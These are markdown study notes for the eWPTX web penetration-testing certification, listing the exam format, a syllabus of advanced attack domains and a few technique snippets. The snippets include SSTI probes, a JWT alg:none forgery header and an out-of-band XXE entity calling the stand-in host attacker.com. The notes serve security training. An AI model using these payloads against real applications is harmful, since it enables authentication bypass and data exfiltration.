# eWPTX

**eLearnSecurity Web Application Penetration Tester eXtreme** — advanced web exploitation covering techniques beyond OWASP Top 10.

## Exam Format

- **Duration:** 7 days
- **Format:** Black-box advanced web assessment
- **Deliverable:** Technical report

## Syllabus

| Domain | Topics |
|--------|--------|
| Advanced XSS | DOM clobbering, mutation XSS, CSP bypass, BeEF |
| Advanced SQLi | Out-of-band exfiltration, stacked queries, WAF bypass |
| Encoding & Evasion | Unicode, polyglots, double encoding, HPP |
| XML & XPATH | XXE, XPATH injection, OOB XXE |
| Deserialization | PHP, Java, Python object deserialization |
| Web Services | SOAP/REST attacks, WSDL enumeration, mass assignment |
| OAuth & JWT | Token forgery, alg:none, key confusion |
| SSRF | Cloud metadata, pivot to internal, Gopher protocol |
| SSTI | Jinja2, Twig, Velocity, Freemarker template injection |
| Race Conditions | Parallel requests, TOCTOU in web apps |

## Key Techniques

```python
# SSTI detection
{{7*7}}  # 49 = vulnerable
${7*7}   # Freemarker/Velocity
<%= 7*7 %>  # ERB

# JWT none algorithm
import base64, json
header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')

# XXE OOB
<!ENTITY % xxe SYSTEM "http://attacker.com/dtd"> %xxe;
```
